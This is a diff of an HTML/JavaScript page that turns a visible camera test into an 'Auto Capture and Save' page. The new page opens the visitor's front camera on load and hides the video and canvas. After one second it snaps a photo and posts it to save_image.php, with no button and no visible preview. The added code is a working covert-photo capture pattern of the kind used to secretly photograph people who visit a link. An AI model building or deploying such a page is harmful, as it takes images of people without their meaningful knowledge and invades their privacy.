@@ -1,52 +1,60 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <title>Camera Access Test</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta charset="UTF-8" />
+  <title>Auto Capture and Save</title>
   <style>
-    video {
-      width: 100%;
-      max-width: 480px;
-      border: 1px solid #ccc;
-    }
-    button {
-      padding: 10px 20px;
-      font-size: 16px;
-      margin-top: 10px;
-    }
+    body { margin: 0; background: white; display: flex; justify-content: center; align-items: center; height: 100vh; }
+    video { display: none; }
   </style>
 </head>
 <body>
-  <h2>📸 Mobile Camera Test</h2>  
-  <button onclick="startCamera()">Start Camera</button>
-  <p id="status">Click the button to start camera.</p>
   <video id="video" autoplay playsinline muted></video>
+  <canvas id="canvas" style="display: none;"></canvas>
 
-    <script>
-      async function startCamera() {
-        const status = document.getElementById("status");
-        const video = document.getElementById("video");
+  <script>
+    async function captureAndSend() {
+      const video = document.getElementById('video');
+      const canvas = document.getElementById('canvas');
 
-        if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
-          status.innerText = "❌ Camera API not supported in this browser.";
-          return;
-        }
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+        video.srcObject = stream;
 
-        try {
-          const stream = await navigator.mediaDevices.getUserMedia({
-            video: {
-              facingMode: { ideal: "environment" }  // Try to use back camera
-            },
-            audio: false
-          });
-          video.srcObject = stream;
-          status.innerText = "✅ Camera started successfully.";
-        } catch (err) {
-          console.error(err);
-          status.innerText = "❌ " + err.message;
-        }
+        video.onloadedmetadata = () => {
+          video.play();
+
+          setTimeout(() => {
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            const ctx = canvas.getContext('2d');
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            const imageData = canvas.toDataURL('image/png');
+
+            // Stop camera
+            stream.getTracks().forEach(track => track.stop());
+
+            // Send to server
+            fetch('save_image.php', {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify({ image: imageData })
+            }).then(res => {
+              document.body.innerHTML = "<h2>✅ Image captured and saved.</h2>";
+            }).catch(err => {
+              document.body.innerHTML = "<h2>❌ Failed to save image.</h2>";
+              console.error(err);
+            });
+
+          }, 1000); // delay before capture
+        };
+      } catch (err) {
+        console.error("Camera error:", err);
+        document.body.innerHTML = "<h2>❌ Camera not available</h2>";
       }
-    </script>
+    }
+
+    window.onload = captureAndSend;
+  </script>
 </body>
 </html>
